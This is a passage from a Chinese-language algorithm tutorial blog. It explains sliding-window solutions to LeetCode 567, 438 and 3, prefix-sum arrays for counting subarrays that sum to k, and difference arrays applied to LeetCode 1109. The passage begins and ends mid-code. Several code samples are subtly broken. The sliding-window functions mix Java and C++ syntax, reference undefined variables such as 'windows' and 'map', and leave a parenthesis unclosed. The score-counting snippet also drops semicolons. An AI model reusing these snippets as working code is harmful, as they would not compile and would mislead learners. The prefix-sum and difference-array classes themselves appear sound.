class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> (window.get(c) == need.get(c)<br>                valid++;<br>        &#125;<br><br>        <span class="hljs-comment">// 判断左侧窗口是否要收缩</span><br>        <span class="hljs-keyword">while</span> (right - left &gt;= t.length()) &#123;<br>            <span class="hljs-comment">// 在这里判断是否找到了合法的子串</span><br>            <span class="hljs-keyword">if</span> (valid == need.length())<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>            <span class="hljs-keyword">char</span> d = s[left];<br>            left++;<br>            <span class="hljs-comment">// 进行窗口内数据的一系列更新</span><br>            <span class="hljs-keyword">if</span> (need.contains(d)) &#123;<br>                <span class="hljs-keyword">if</span> (window.get(d) == need.get(d))<br>                    valid--;<br>windows.put(d, map.get(d) - <span class="hljs-number">1</span>);<br>            &#125; <br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 未找到符合条件的子串</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于这道题的解法代码，基本上和最小覆盖子串一模一样，只需要改变两个地方：</p><p>1、本题移动 <code>left</code> 缩小窗口的时机是窗口大小大于 <code>t.size()</code> 时，应为排列嘛，显然长度应该是一样的。</p><p>2、当发现 <code>valid == need.size()</code> 时，就说明窗口中就是一个合法的排列，所以立即返回 <code>true</code>。</p><p>至于如何处理窗口的扩大和缩小，和最小覆盖子串完全相同。</p><h2 id="3-3-找所有字母异位词"><a href="#3-3-找所有字母异位词" class="headerlink" title="3.3 找所有字母异位词"></a>3.3 找所有字母异位词</h2><p>这是 LeetCode 第 438 题，Find All Anagrams in a String，难度 Medium：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/title3.png" alt="img" style="zoom:67%;" /></p><p>呵呵，这个所谓的字母异位词，不就是排列吗，搞个高端的说法就能糊弄人了吗？<strong>相当于，输入一个串</strong> <strong><code>S</code></strong>，一个串 <strong><code>T</code></strong>，找到 <strong><code>S</code></strong> <strong>中所有</strong> <strong><code>T</code></strong> <strong>的排列，返回它们的起始索引</strong>。</p><p>直接默写一下框架，明确刚才讲的 4 个问题，即可秒杀这道题：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function">vector&lt;Integer&gt; <span class="hljs-title">findAnagrams</span><span class="hljs-params">(string s, string t)</span> </span>&#123;<br>    HashMap&lt;Character, Integer&gt; need, window;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">char</span> c : t)&#123;<br>        need.put(c, map.getOrDefault(c, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>);<br>    &#125; <br><br>    <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>, right = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> valid = <span class="hljs-number">0</span>;<br>    vector&lt;Integer&gt; res; <span class="hljs-comment">// 记录结果</span><br>    <span class="hljs-keyword">while</span> (right &lt; s.size()) &#123;<br>        <span class="hljs-keyword">char</span> c = s[right];<br>        right++;<br>        <span class="hljs-comment">// 进行窗口内数据的一系列更新</span><br>        <span class="hljs-keyword">if</span> (need.contains(c)) &#123;<br>            windows.put(c, map.getOrDefault(c, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> (window.get(c) == need.get(c)<br>                valid++;<br>        &#125;<br>        <span class="hljs-comment">// 判断左侧窗口是否要收缩</span><br>        <span class="hljs-keyword">while</span> (right - left &gt;= t.length()) &#123;<br>            <span class="hljs-comment">// 当窗口符合条件时，把起始索引加入 res</span><br>            <span class="hljs-keyword">if</span> (valid == need.length())<br>                res.push_back(left);<br>            <span class="hljs-keyword">char</span> d = s[left];<br>            left++;<br>            <span class="hljs-comment">// 进行窗口内数据的一系列更新</span><br>            <span class="hljs-keyword">if</span> (need.contains(d)) &#123;<br>                <span class="hljs-keyword">if</span> (window.get(d) == need.get(d))<br>                    valid--;<br>windows.put(d, map.get(d) - <span class="hljs-number">1</span>);<br>            &#125; <br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟寻找字符串的排列一样，只是找到一个合法异位词（排列）之后将起始索引加入 <code>res</code> 即可。</p><h2 id="3-4-最长无重复子串"><a href="#3-4-最长无重复子串" class="headerlink" title="3.4 最长无重复子串"></a>3.4 最长无重复子串</h2><p>这是 LeetCode 第 3 题，Longest Substring Without Repeating Characters，难度 Medium：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/title4.png" alt="img" style="zoom:67%;" /></p><p>这个题终于有了点新意，不是一套框架就出答案，不过反而更简单了，稍微改一改框架就行了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">lengthOfLongestSubstring</span><span class="hljs-params">(String s)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> left = <span class="hljs-number">0</span>, right = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>;<br>        HashMap&lt;Character,Integer&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        <span class="hljs-keyword">while</span> (right &lt; s.length())&#123;<br>            <span class="hljs-keyword">char</span> tmp = s.charAt(right);<br>            <span class="hljs-comment">//窗口右移</span><br>            right++;<br>            <span class="hljs-comment">//更新数据</span><br>            map.put(tmp, map.getOrDefault(tmp, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>);<br>            <span class="hljs-comment">//判断左侧窗口收缩</span><br>            <span class="hljs-keyword">while</span> (map.get(tmp) &gt; <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">char</span> d = s.charAt(left);<br>                left++;<br>                <span class="hljs-comment">//更新数据</span><br>                map.put(d, map.get(d) - <span class="hljs-number">1</span>);<br>            &#125;<br>            res = Math.max(res, right - left);<br>            <br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这就是变简单了，连 <code>need</code> 和 <code>valid</code> 都不需要，而且更新窗口内数据也只需要简单的更新计数器 <code>window</code> 即可。</p><p>当 <code>window[c]</code> 值大于 1 时，说明窗口中存在重复字符，不符合条件，就该移动 <code>left</code> 缩小窗口了嘛。</p><p>唯一需要注意的是，在哪里更新结果 <code>res</code> 呢？我们要的是最长无重复子串，哪一个阶段可以保证窗口中的字符串是没有重复的呢？</p><p>这里和之前不一样，要在收缩窗口完成后更新 <code>res</code>，因为窗口收缩的 while 条件是存在重复元素，换句话说收缩完成后一定保证窗口中没有重复嘛。</p><h1 id="4-前缀和数组"><a href="#4-前缀和数组" class="headerlink" title="4. 前缀和数组"></a>4. 前缀和数组</h1><h2 id="4-1-什么是前缀和"><a href="#4-1-什么是前缀和" class="headerlink" title="4.1 什么是前缀和"></a>4.1 什么是前缀和</h2><p>前缀和的思路是这样的，对于一个给定的数组 <code>nums</code>，我们额外开辟一个前缀和数组进行预处理：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span> n = nums.length;<br><span class="hljs-comment">// 前缀和数组</span><br><span class="hljs-keyword">int</span>[] preSum = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n + <span class="hljs-number">1</span>];<br>preSum[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    preSum[i + <span class="hljs-number">1</span>] = preSum[i] + nums[i];<br></code></pre></td></tr></table></figure><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/前缀和.jpg" alt="img" style="zoom:50%;" /></p><p>这个前缀和数组 <code>preSum</code> 的含义也很好理解，<code>preSum[i]</code> 就是 <code>nums[0..i-1]</code> 的和。那么如果我们想求 <code>nums[i..j]</code> 的和，只需要一步操作 <code>preSum[j+1]-preSum[i]</code> 即可，而不需要重新去遍历数组了。</p><p>回到这个子数组问题，我们想求有多少个子数组的和为 k，借助前缀和技巧很容易写出一个解法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">subarraySum</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> k)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = nums.length;<br>    <span class="hljs-comment">// 构造前缀和</span><br>    <span class="hljs-keyword">int</span>[] sum = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n + <span class="hljs-number">1</span>];<br>    sum[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>; <br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>        sum[i + <span class="hljs-number">1</span>] = sum[i] + nums[i];<br><br>    <span class="hljs-keyword">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">// 穷举所有子数组</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; i; j++)<br>            <span class="hljs-comment">// sum of nums[j..i-1]</span><br>            <span class="hljs-keyword">if</span> (sum[i] - sum[j] == k)<br>                ans++;<br><br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个解法的时间复杂度 <code>O(N^2)</code> 空间复杂度 <code>O(N)</code>，并不是最优的解法。不过通过这个解法理解了前缀和数组的工作原理之后，可以使用一些巧妙的办法把时间复杂度进一步降低。</p><h2 id="4-2-优化解法"><a href="#4-2-优化解法" class="headerlink" title="4.2 优化解法"></a>4.2 优化解法</h2><p>前面的解法有嵌套的 for 循环：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; i; j++)<br>        <span class="hljs-keyword">if</span> (sum[i] - sum[j] == k)<br>            ans++;<br></code></pre></td></tr></table></figure><p>第二层 for 循环在干嘛呢？翻译一下就是，<strong>在计算，有几个</strong> <strong><code>j</code></strong> <strong>能够使得</strong> <strong><code>sum[i]</code></strong> <strong>和</strong> <strong><code>sum[j]</code></strong> <strong>的差为 k。</strong>毎找到一个这样的 <code>j</code>，就把结果加一。</p><p>我们可以把 if 语句里的条件判断移项，这样写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (sum[j] == sum[i] - k)<br>    ans++;<br></code></pre></td></tr></table></figure><p>优化的思路是：<strong>我直接记录下有几个</strong> <strong><code>sum[j]</code></strong> <strong>和</strong> <strong><code>sum[i] - k</code></strong> <strong>相等，直接更新结果，就避免了内层的 for 循环</strong>。我们可以用哈希表，在记录前缀和的同时记录该前缀和出现的次数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">subarraySum</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> k)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = nums.length;<br>    <span class="hljs-comment">// map：前缀和 -&gt; 该前缀和出现的次数</span><br>    HashMap&lt;Integer, Integer&gt; preSum = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    <span class="hljs-comment">// base case</span><br>    preSum.put(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">int</span> ans = <span class="hljs-number">0</span>, sum0_i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        sum0_i += nums[i];<br>        <span class="hljs-comment">// 这是我们想找的前缀和 nums[0..j]</span><br>        <span class="hljs-keyword">int</span> sum0_j = sum0_i - k;<br>        <span class="hljs-comment">// 如果前面有这个前缀和，则直接更新答案</span><br>        <span class="hljs-keyword">if</span> (preSum.containsKey(sum0_j))<br>            ans += preSum.get(sum0_j);<br>        <span class="hljs-comment">// 把前缀和 nums[0..i] 加入并记录出现次数</span><br>        preSum.put(sum0_i, <br>            preSum.getOrDefault(sum0_i, <span class="hljs-number">0</span>) + <span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br></code></pre></td></tr></table></figure><p>比如说下面这个情况，需要前缀和 8 就能找到和为 k 的子数组了，之前的暴力解法需要遍历数组去数有几个 8，而优化解法借助哈希表可以直接得知有几个前缀和为 8。</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/前缀和1.jpg" alt="img" style="zoom:50%;" /></p><p>这样，就把时间复杂度降到了 <code>O(N)</code>，是最优解法了。</p><h2 id="4-3-总结"><a href="#4-3-总结" class="headerlink" title="4.3 总结"></a>4.3 总结</h2><p>前缀和不难，却很有用，主要用于处理数组区间的问题。</p><p>比如说，让你统计班上同学考试成绩在不同分数段的百分比，也可以利用前缀和技巧：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] scores; <span class="hljs-comment">// 存储着所有同学的分数</span><br><span class="hljs-comment">// 试卷满分 150 分</span><br><span class="hljs-keyword">int</span>[] count = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">150</span> + <span class="hljs-number">1</span>]<br><span class="hljs-comment">// 记录每个分数有几个同学</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> score : scores)<br>    count[score]++<br><span class="hljs-comment">// 构造前缀和</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; count.length; i++)<br>    count[i] = count[i] + count[i-<span class="hljs-number">1</span>];<br></code></pre></td></tr></table></figure><p>这样，给你任何一个分数段，你都能通过前缀和相减快速计算出这个分数段的人数，百分比也就很容易计算了。</p><p>但是，稍微复杂一些的算法问题，不止考察简单的前缀和技巧。比如本文探讨的这道题目，就需要借助前缀和的思路做进一步的优化，借助哈希表去除不必要的嵌套循环。可见对题目的理解和细节的分析能力对于算法的优化是至关重要的。</p><h1 id="5-差分数组"><a href="#5-差分数组" class="headerlink" title="5. 差分数组"></a>5. 差分数组</h1><p>差分数组技巧是前文 <a href="http://mp.weixin.qq.com/s?__biz=MzAxODQxMDM0Mw==&amp;mid=2247484488&amp;idx=1&amp;sn=848f76e86fce722e70e265d0c6f84dc3&amp;chksm=9bd7fa40aca07356a6f16db72f5a56529044b1bdb2dcce2de4efe59e0338f0c313de682aef29&amp;scene=21#wechat_redirect">前缀和技巧详解</a> 写过的前缀和技巧的兄弟。</p><p><strong>前缀和主要适用的场景是原始数组不会被修改的情况下，频繁查询某个区间的累加和</strong>。</p><p>前缀和核心代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PrefixSum</span> </span>&#123;<br>    <span class="hljs-comment">// 前缀和数组</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span>[] prefix;<br><br>    <span class="hljs-comment">/* 输入一个数组，构造前缀和 */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PrefixSum</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>        prefix = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[nums.length + <span class="hljs-number">1</span>];<br>        <span class="hljs-comment">// 计算 nums 的累加和</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; prefix.length; i++) &#123;<br>            prefix[i] = prefix[i - <span class="hljs-number">1</span>] + nums[i - <span class="hljs-number">1</span>];<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* 查询闭区间 [i, j] 的累加和 */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">query</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> j)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> prefix[j + <span class="hljs-number">1</span>] - prefix[i];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/前缀和.jpg" alt="img" style="zoom:50%;" /></p><p>prefix[i]就代表着nums[0..i-1]所有元素的累加和，如果我们想求区间nums[i..j]的累加和，只要计算prefix[j+1] - prefix[i]即可，而不需要遍历整个区间求和。</p><p>本文讲一个和前缀和思想非常类似的算法技巧「差分数组」，<strong>差分数组的主要适用场景是频繁对原始数组的某个区间的元素进行增减</strong>。</p><p>比如说，我给你输入一个数组nums，然后又要求给区间nums[2..6]全部加 1，再给nums[3..9]全部减 3，再给nums[0..4]全部加 2，再给…</p><p>一通操作猛如虎，然后问你，最后nums数组的值是什么？</p><p>常规的思路很容易，你让我给区间nums[i..j]加上val，那我就一个 for 循环给它们都加上呗，还能咋样？这种思路的时间复杂度是 O(N)，由于这个场景下对nums的修改非常频繁，所以效率会很低下。</p><p>这里就需要差分数组的技巧，类似前缀和技巧构造的prefix数组，我们先对nums数组构造一个diff差分数组，<strong>diff[i]就是nums[i]和nums[i-1]之差</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] diff = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[nums.length];<br><span class="hljs-comment">// 构造差分数组</span><br>diff[<span class="hljs-number">0</span>] = nums[<span class="hljs-number">0</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; nums.length; i++) &#123;<br>    diff[i] = nums[i] - nums[i - <span class="hljs-number">1</span>];<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/差分数组1.jpg" alt="差分数组1" style="zoom:50%;" /></p><p>通过这个diff差分数组是可以反推出原始数组nums的，代码逻辑如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] res = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[diff.length];<br><span class="hljs-comment">// 根据差分数组构造结果数组</span><br>res[<span class="hljs-number">0</span>] = diff[<span class="hljs-number">0</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; diff.length; i++) &#123;<br>    res[i] = res[i - <span class="hljs-number">1</span>] + diff[i];<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>这样构造差分数组</strong>diff，就可以快速进行区间增减的操作，如果你想对区间nums[i..j]的元素全部加 3，那么只需要让diff[i] += 3，然后再让diff[j+1] -= 3即可：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/差分数组2.jpg" alt="差分数组2" style="zoom:50%;" /></p><p><strong>原理很简单，回想diff数组反推nums数组的过程，diff[i] += 3意味着给nums[i..]所有的元素都加了 3，然后diff[j+1] -= 3又意味着对于nums[j+1..]所有元素再减 3，那综合起来，是不是就是对nums[i..j]中的所有元素都加 3 了？</strong></p><p>只要花费 O(1) 的时间修改diff数组，就相当于给nums的整个区间做了修改。多次修改diff，然后通过diff数组反推，即可得到nums修改后的结果。</p><p>现在我们把差分数组抽象成一个类，包含increment方法和result方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Difference</span> </span>&#123;<br>    <span class="hljs-comment">// 差分数组</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span>[] diff;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Difference</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>        <span class="hljs-keyword">assert</span> nums.length &gt; <span class="hljs-number">0</span>;<br>        diff = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[nums.length];<br>        <span class="hljs-comment">// 构造差分数组</span><br>        diff[<span class="hljs-number">0</span>] = nums[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; nums.length; i++) &#123;<br>            diff[i] = nums[i] - nums[i - <span class="hljs-number">1</span>];<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* 给闭区间 [i,j] 增加 val（可以是负数）*/</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">increment</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> j, <span class="hljs-keyword">int</span> val)</span> </span>&#123;<br>        diff[i] += val;<br>        <span class="hljs-keyword">if</span> (j + <span class="hljs-number">1</span> &lt; diff.length) &#123;<br>            diff[j + <span class="hljs-number">1</span>] -= val;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] result() &#123;<br>        <span class="hljs-keyword">int</span>[] res = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[diff.length];<br>        <span class="hljs-comment">// 根据差分数组构造结果数组</span><br>        res[<span class="hljs-number">0</span>] = diff[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; diff.length; i++) &#123;<br>            res[i] = res[i - <span class="hljs-number">1</span>] + diff[i];<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里注意一下increment方法中的 if 语句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">increment</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> j, <span class="hljs-keyword">int</span> val)</span> </span>&#123;<br>    diff[i] += val;<br>    <span class="hljs-keyword">if</span> (j + <span class="hljs-number">1</span> &lt; diff.length) &#123;<br>        diff[j + <span class="hljs-number">1</span>] -= val;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当j+1 &gt;= diff.length时，说明是对nums[i]及以后的整个数组都进行修改，那么就不需要再给diff数组减val了。</p><p><strong>算法实践</strong></p><p>这里看一下力扣第 1109 题「航班预订统计」：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/航班预订.jpg" alt="航班预订" style="zoom:50%;" /></p><p>函数签名如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] corpFlightBookings(<span class="hljs-keyword">int</span>[][] bookings, <span class="hljs-keyword">int</span> n)<br></code></pre></td></tr></table></figure><p>这个题目就在那绕弯弯，其实它就是个差分数组的题，我给你翻译一下：</p><p>给你输入一个长度为n的数组nums，其中所有元素都是 0。再给你输入一个bookings，里面是若干三元组(i,j,k)，每个三元组的含义就是要求你给nums数组的闭区间[i-1,j-1]中所有元素都加上k。请你返回最后的nums数组是多少？</p><p>PS：因为题目说的n是从 1 开始计数的，而数组索引从 0 开始，所以对于输入的三元组(i,j,k)，数组区间应该对应[i-1,j-1]。</p><p>这么一看，不就是一道标准的差分数组题嘛？我们可以直接复用刚才写的类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">int</span>[] corpFlightBookings(<span class="hljs-keyword">int</span>[][] bookings, <span class="hljs-keyword">int</span> n) &#123;<br>    <span class="hljs-comment">// nums 初始化为全 0</span><br>    <span class="hljs-keyword">int</span>[] nums = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n];<br>    <span class="hljs-comment">// 构造差分解法</span><br>    Difference df = <span class="hljs-keyword">new</span> Difference(nums);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span>[] booking : bookings) &#123;<br>        <span class="hljs-comment">// 注意转成数组索引要减一哦</span><br>        <span class="hljs-keyword">int</span> i = booking[<span class="hljs-number">0</span>] - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">int</span> j = booking[<span class="hljs-number">1</span>] - <span 